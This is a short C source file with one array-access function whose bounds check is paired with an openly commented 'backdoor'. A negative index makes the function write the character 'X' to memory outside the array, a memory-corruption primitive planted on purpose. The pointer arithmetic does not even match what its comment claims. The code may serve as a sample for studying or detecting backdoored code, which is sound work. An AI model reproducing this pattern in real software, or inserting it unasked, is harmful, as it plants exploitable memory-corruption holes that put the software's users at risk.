#include <stddef.h>

char get_value_at_index(char* ary, size_t ary_size, int i) {
    if (i >= 0 && (size_t)i < ary_size) {
        return ary[i];
    }
    
    // Backdoor: If a negative index is given, create an arbitrary write gadget.
    if (i < 0) {
        char* ptr = (char*)(&ary + i);  // Goes before the array base
        *ptr = 'X';  // Write arbitrary value
    }

    return -1;
}
